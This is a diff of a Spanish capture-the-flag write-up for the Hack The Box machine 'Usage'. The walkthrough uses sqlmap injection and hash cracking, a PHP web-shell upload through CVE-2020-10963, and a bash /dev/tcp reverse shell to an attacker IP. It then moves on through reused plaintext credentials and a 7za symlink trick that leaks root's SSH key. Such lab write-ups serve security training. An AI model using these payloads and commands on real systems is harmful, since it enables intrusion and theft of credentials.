@@ -168,7 +168,7 @@ Finalmente, en la sección de `Admin`, al acceder somos redirigidos a [http://ad
 {% endtab %}
 {% endtabs %}
 
-Accederemos a http://usage.htb/register y probaremos de registrarnos con un nuevo usuario llamado `gzzcoo`.
+Accederemos a [http://usage.htb/register](http://usage.htb/register) y probaremos de registrarnos con un nuevo usuario llamado `gzzcoo`.
 
 <figure><img src="../../.gitbook/assets/imagen (3).png" alt=""><figcaption></figcaption></figure>
 
@@ -180,7 +180,7 @@ Al acceder con nuestras credenciales, nos encontramos con un blog en el cual apa
 
 <figure><img src="../../.gitbook/assets/imagen (5).png" alt=""><figcaption></figcaption></figure>
 
-Al intentar acceder a una página que no existe, como por ejemplo http://usage.htb/gzzcoo, nos encontramos con el siguiente mensaje de error.
+Al intentar acceder a una página que no existe, como por ejemplo [http://usage.htb/gzzcoo](http://usage.htb/gzzcoo), nos encontramos con el siguiente mensaje de error.
 
 <figure><img src="../../.gitbook/assets/imagen (9).png" alt=""><figcaption></figcaption></figure>
 
@@ -217,7 +217,9 @@ X-XSS-Protection: 1; mode=block
 X-Content-Type-Options: nosniff
 ```
 
+## Initial Access
 
+### SQL Injection - Boolean-Based Blind Injection (sqlmap)
 
 En [http://usage.htb/forget-password](http://usage.htb/forget-password) nos encontramos con una opción de restablecimiento de la contraseña. Al ingresar nuestro correo electrónico, verificamos que en un principio se envía un correo de restablecimiento de nuestra contraseña.
 
@@ -370,7 +372,7 @@ Database: usage_blog
 [*] ending @ 00:22:02 /2025-03-07/
 ```
 
-
+Realizamos un `dump` del contenido de las columnas presentes en la tabla `admin_users` y logramos encontrar la contraseña de usuario `Administrator` en formato hash.
 
 ```bash
 ❯ sqlmap -r request --level 5 --risk 3 --threads 10 -p email --batch --dbms MySQL -D usage_blog -T admin_users --dump
@@ -404,7 +406,11 @@ Table: admin_users
 [*] ending @ 00:31:14 /2025-03-07/
 ```
 
+### Cracking hashes
 
+Comprobaremos a través de `hashid`de que el hash está en el siguiente formato, guardaremos este hash en un archivo llamado `hashes`.
+
+A través de la herramienta de cracking, conocida como `john`, utilizaremos el diccionario de `rockyou.txt` y finalmente logramos romper el hash y obtener la contraseña en texto plano.
 
 <pre class="language-bash"><code class="lang-bash">❯ hashid '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2'
 Analyzing '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2'
@@ -426,19 +432,29 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 </code></pre>
 
-
+Ingresaremos [http://admin.usage.htb](http://admin.usage.htb) y probaremos de acceder a través de las credenciales obtenidas.
 
 <figure><img src="../../.gitbook/assets/imagen (482).png" alt=""><figcaption></figcaption></figure>
 
+### Laravel Administrator 1.8.17 Exploitation - Arbitrary File Upload \[RCE] (CVE-2020-10963)
 
+Nos encontramos con un panel de administración de `Laravel` en el cual en el footer nos aparece la versión `1.8.17`.
 
 <figure><img src="../../.gitbook/assets/imagen (483).png" alt=""><figcaption></figcaption></figure>
 
-
+Buscamos por Internet sobre diferentes vulnerabilidades de esta versión, en el cual encontramos el siguiente `CVE-2020-10963`.
 
 <figure><img src="../../.gitbook/assets/imagen (484).png" alt=""><figcaption></figcaption></figure>
 
+{% embed url="https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2020-10963" %}
 
+{% hint style="danger" %}
+FrozenNode Laravel-Administrator versiones hasta 5.0.12, permite una carga de archivos sin restricciones (y, en consecuencia, una Ejecución de Código Remota) por medio de una imagen de admin/tips\_image/image/file\_upload con contenido PHP dentro de una imagen GIF que tiene la extensión .php. NOTA: este producto está descontinuado.
+{% endhint %}
+
+Para poder abusar de esta vulnerabilidad, el objetivo será subir un archivo con extensión de imágen como `.jpg` y modificar antes de que se envíe en el servidor por la extensión `PHP`.&#x20;
+
+Nuestro archivo `gzzcoo.jpg` contiene el siguiente contenido `PHP` que se trata de una `web shell`.
 
 ```bash
 ❯ cat gzzcoo.jpg
@@ -447,29 +463,31 @@ Session completed.
 ?>
 ```
 
-
+Accederemos a las propiedades del usuario `Administrator` y subiremos nuestro archivo malicioso, antes de darle a `Submit`, deberemos de interceptar la solicitud a través de `BurpSuite`.
 
 <figure><img src="../../.gitbook/assets/5412_vmware_yfgDrNJ2Bq.png" alt=""><figcaption></figcaption></figure>
 
+Al interceptar la solicitud, deberemos modificar la extensión del archivo para indicarle que sea `PHP` y así poder realizar el `Arbitrary File Upload`. Una vez lo modifiquemos, le daremos a `Forward`.
+
 <figure><img src="../../.gitbook/assets/imagen (485).png" alt=""><figcaption></figcaption></figure>
 
-
+Verificamos que se nos redirige a `/admin/auth/setting`en el cual volveremos a darle a `Forward`.
 
 <figure><img src="../../.gitbook/assets/imagen (486).png" alt=""><figcaption></figcaption></figure>
 
-
+Somos redirigidos a `/uploads/images/gzzcoo.php`, finalmente le daremos a `Forward` nuevamente.
 
 <figure><img src="../../.gitbook/assets/imagen (487).png" alt=""><figcaption></figcaption></figure>
 
-
+Verificamos que se ha subido correctamente al parecer nuestro archivo malicioso pero con extensión `PHP`.
 
 <figure><img src="../../.gitbook/assets/imagen (488).png" alt=""><figcaption></figcaption></figure>
 
-
+Haremos click derecho sobre la imagen e ingresaremos a la opción de `Open Image in New Tab`.
 
 <figure><img src="../../.gitbook/assets/imagen (489).png" alt=""><figcaption></figcaption></figure>
 
-
+Al acceder a la imagen, seremos redirigidos al directorio donde se ha subido nuestra `web shell`. Verificamos que podemos ejecutar comandos arbitrarios en el sistema vulnerable desde la misma página web o desde la herramienta `cURL`.
 
 <figure><img src="../../.gitbook/assets/imagen (490).png" alt=""><figcaption></figcaption></figure>
 
@@ -478,14 +496,14 @@ Session completed.
 uid=1000(dash) gid=1000(dash) groups=1000(dash)
 ```
 
-
+El siguiente paso será lograr obtener acceso remoto al sistema, para ello nos pondremos en escucha con `nc`.
 
 ```bash
 ❯ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
+Aplicaremos un `URL Encode` hacia el comando que queremos ejecutar, que en este caso es una Reverse Shell y utilizaremos la `web shell` para ejecutar la Reverse Shell.
 
 ```bash
 ❯ echo -n 'bash -c "bash -i >& /dev/tcp/10.10.14.2/443 0>&1"' | jq -sRr @uri
@@ -494,7 +512,7 @@ bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.2%2F443%200%3E%261%2
 ❯ curl -s 'http://admin.usage.htb/uploads/images/gzzcoo.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.2%2F443%200%3E%261%22'
 ```
 
-
+Comprobaremos que logramos acceder al sistema con el usuario `dash` y podemos visualizar la flag **user.txt**.
 
 ```bash
 ❯ nc -nlvp 443
@@ -503,10 +521,10 @@ connect to [10.10.14.2] from (UNKNOWN) [10.10.11.18] 58584
 bash: cannot set terminal process group (1206): Inappropriate ioctl for device
 bash: no job control in this shell
 dash@usage:/var/www/html/project_admin/public/uploads/images$ cat /home/dash/user.txt    
-cbd70f2e73f891b68bd359604419c4ac
+cbd70***************************
 ```
 
-
+Al obtener la Reverse Shell, realizaremos el tratamiento básico para obtener finalmente una TTY totalmente interactiva.
 
 ```bash
 dash@usage:/var/www/html/project_admin/public/uploads/images$ script /dev/null -c bash
@@ -522,7 +540,9 @@ dash@usage:/var/www/html/project_admin/public/uploads/images$ export SHELL=bash
 dash@usage:/var/www/html/project_admin/public/uploads/images$ stty rows 46 columns 230
 ```
 
+## Pivoting as xander user
 
+Revisando el archivo `/etc/passwd`, nos encontramos con la existencia de otro usuario que dispone de `bash`. Esta información también logramos corroborarla en el directorio `/home`.
 
 ```bash
 dash@usage:~$ cat /etc/passwd | grep bash; echo; ls -l /home
@@ -535,7 +555,13 @@ drwxr-x--- 6 dash   dash   4096 Mar  6 23:53 dash
 drwxr-x--- 4 xander xander 4096 Apr  2  2024 xander
 ```
 
+### Information Leakage
 
+Revisando nuestro directorio personal `/home/dash`, nos encontramos con un archivo `.monitrc`. Este archivo comprobamos que contiene credenciales en texto plano que podríamos intentar comprobar si se reutilizan en algún sitio.
+
+{% hint style="info" %}
+Sobre Monit. Se trata de una herramienta para la gestión y seguimiento de procesos, programas, archivos, directorios y sistemas de archivos en sistemas similares a UNIX. Lleva a cabo el mantenimiento y reparación automática y puede ejecutar acciones significativas para solventar la situación de error.
+{% endhint %}
 
 ```bash
 dash@usage:~$ ls -la
@@ -581,51 +607,23 @@ check filesystem rootfs with path /
        if space usage > 80% then alert
 ```
 
-
+Probamos de comprobar si estas credenciales se reutilizan para el usuario `xander`. Accedemos finalmente al equipo a través de `SSH` con las credenciales encontradas.
 
 ```bash
 ❯ sshpass -p '3nc0d3d_pa$$w0rd' ssh xander@usage.htb
 Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)
 
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/pro
+...[snip]...
 
-  System information as of Mon Apr  8 01:17:46 PM UTC 2024
-
-  System load:           1.9072265625
-  Usage of /:            64.8% of 6.53GB
-  Memory usage:          18%
-  Swap usage:            0%
-  Processes:             254
-  Users logged in:       0
-  IPv4 address for eth0: 10.10.11.18
-  IPv6 address for eth0: dead:beef::250:56ff:feb9:5616
-
-
-Expanded Security Maintenance for Applications is not enabled.
-
-0 updates can be applied immediately.
-
-Enable ESM Apps to receive additional future security updates.
-See https://ubuntu.com/esm or run: sudo pro status
-
-
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
-
-
-The programs included with the Ubuntu system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
-applicable law.
-
-xander@usage:~$ 
+xander@usage:~$ whoami
+xander
 ```
 
+## Privilege Escalation
 
+### Abusing sudoers privilege
+
+Revisando si el usuario `xander` dispone de algún privilegio de `sudoers`, nos encontramos que puede ejecutar como `sudo` el binario llamado `/usr/bin/usage_management`.
 
 ```bash
 xander@usage:~$ sudo -l
@@ -636,9 +634,25 @@ User xander may run the following commands on usage:
     (ALL : ALL) NOPASSWD: /usr/bin/usage_management
 ```
 
+### Analyzing binary with strings and GHIDRA
 
+Comprobamos que el binario `usage_managment` se trata de un ejecutable `ELF`. Por otro lado, verificamos el hash `MD5` del binario y verificamos en `Virus Total` que al parecer se trata de un binario personalizado para la máquina `Usage`.
 
+```bash
+xander@usage:~$ file /usr/bin/usage_management
+/usr/bin/usage_management: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=fdb8c912d98c85eb5970211443440a15d910ce7f, for GNU/Linux 3.2.0, not stripped
 
+xander@usage:~$ md5sum /usr/bin/usage_management
+f3c1b2b1ccacc24cc7ed8f3ad62bb7c6  /usr/bin/usage_management
+```
+
+<figure><img src="../../.gitbook/assets/imagen (491).png" alt=""><figcaption></figcaption></figure>
+
+Revisaremos el funcionamiento del binario, en el cual disponemos de 3 opciones:
+
+* Project Backup --> Realiza una copia de seguridad y lo almacena en `/var/backups/projects.zip`.
+* Backup MySQL data --> Realiza una copia de seguridad de MySQL.
+* Reset admin password --> Realiza un restablecimiento de la contraseña de `admin`.
 
 {% tabs %}
 {% tab title="Project Backup" %}
@@ -692,19 +706,15 @@ Password has been reset.
 {% endtab %}
 {% endtabs %}
 
+Por otro lado, comprobamos a través de `strings` sobre cadenas visibles que se encuentren en el binario para verificar cómo funciona.
 
+Identificamos que el binario `usage_management`, ubicado en el sistema, ejecuta el siguiente comando para generar copias de seguridad:
 
 ```bash
-xander@usage:~$ file /usr/bin/usage_management
-/usr/bin/usage_management: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=fdb8c912d98c85eb5970211443440a15d910ce7f, for GNU/Linux 3.2.0, not stripped
-
-xander@usage:~$ md5sum /usr/bin/usage_management
-f3c1b2b1ccacc24cc7ed8f3ad62bb7c6  /usr/bin/usage_management
+/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
 ```
 
-<figure><img src="../../.gitbook/assets/imagen (491).png" alt=""><figcaption></figcaption></figure>
-
-
+Este uso de `7za` presenta una vulnerabilidad que permite la lectura arbitraria de archivos. Según la documentación de `HackTricks`, cuando `7za` encuentra un archivo con el prefijo `@`, lo interpreta como una lista de archivos que debe comprimir. Si tenemos la capacidad de crear archivos en el directorio donde se ejecuta el comando, podemos aprovechar este comportamiento para forzar la lectura de archivos arbitrarios.
 
 ```bash
 xander@usage:~$ strings /usr/bin/usage_management
@@ -739,11 +749,43 @@ Enter your choice (1/2/3):
 Invalid choice.
 ```
 
-
-
 {% embed url="https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html#7z" %}
 
 
+
+```bash
+root@usage:/usr/bin# ls -l usage_management 
+-rwxr-xr-x 1 root root 16312 Oct 28  2023 usage_management
+root@usage:/usr/bin# python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+```
+
+
+
+```bash
+❯ wget 10.10.11.18:8080/usage_management
+--2025-03-07 02:22:44--  http://10.10.11.18:8080/usage_management
+Conectando con 10.10.11.18:8080... conectado.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 16312 (16K) [application/octet-stream]
+Grabando a: «usage_management»
+
+usage_management                                          100%[==================================================================================================================================>]  15,93K  --.-KB/s    en 0,06s   
+
+2025-03-07 02:22:45 (247 KB/s) - «usage_management» guardado [16312/16312]
+
+❯ chmod +x usage_management
+```
+
+Desde `GHIDRA` también logramos visualizar el funcionamiento del binario.
+
+<figure><img src="../../.gitbook/assets/imagen (493).png" alt=""><figcaption></figcaption></figure>
+
+### Exploitation custom binary to get root shell
+
+Para explotar esta vulnerabilidad y leer la clave privada SSH del usuario root, primero nos ubicamos en el directorio donde se ejecuta **7za**. Luego, creamos un archivo llamado `@id_rsa` para indicar que **7za** debe tratar `id_rsa` como una lista de archivos a comprimir.
+
+A continuación, creamos un enlace simbólico llamado `id_rsa` que apunta a `/root/.ssh/id_rsa`. De esta forma, cuando **7za** intente leer `id_rsa`, en realidad accederá a la clave privada de root y la mostrará en un error, permitiéndonos obtener su contenido.
 
 ```bash
 xander@usage:/$ cd /var/www/html/
@@ -757,7 +799,7 @@ drwxrwxr-x 13 dash   dash   4096 Apr  2  2024 project_admin
 drwxrwxr-x 12 dash   dash   4096 Apr  2  2024 usage_blog
 ```
 
-
+Al ejecutar el binario `/usr/bin/usage_management` a través de la opción `1` que es la que ejecuta el `7za` finalmente logramos leer el archivo `id_rsa` del usuario `root`.
 
 ```bash
 xander@usage:/var/www/html$ sudo /usr/bin/usage_management
@@ -828,9 +870,11 @@ H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
 Scan WARNINGS: 7
 ```
 
+Copiaremos el contenido en nuestra máquina local en un archivo llamado `id_rsa`, el cual deberemos de tratar para eliminar los carácteres que no nos interesen.
 
+Le daremos los permisos correspondientes para poder hacer uso de la clave privada y trataremos de acceder con el usuario `root`.
 
-
+Finalmente, logramos obtener acceso al equipo a través del usuario `root` y la clave privada `id_rsa`sin necesidad de proporcionar credenciales. Por último, visualizamos el contenido de la flag **root.txt**.
 
 ```bash
 ❯ cat id_rsa
@@ -880,5 +924,5 @@ Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your 
 
 Last login: Mon Apr  8 13:17:47 2024 from 10.10.14.40
 root@usage:~# cat /root/root.txt 
-f4087919fd8aa7d094652fea39cff332
+f4087***************************
 ```
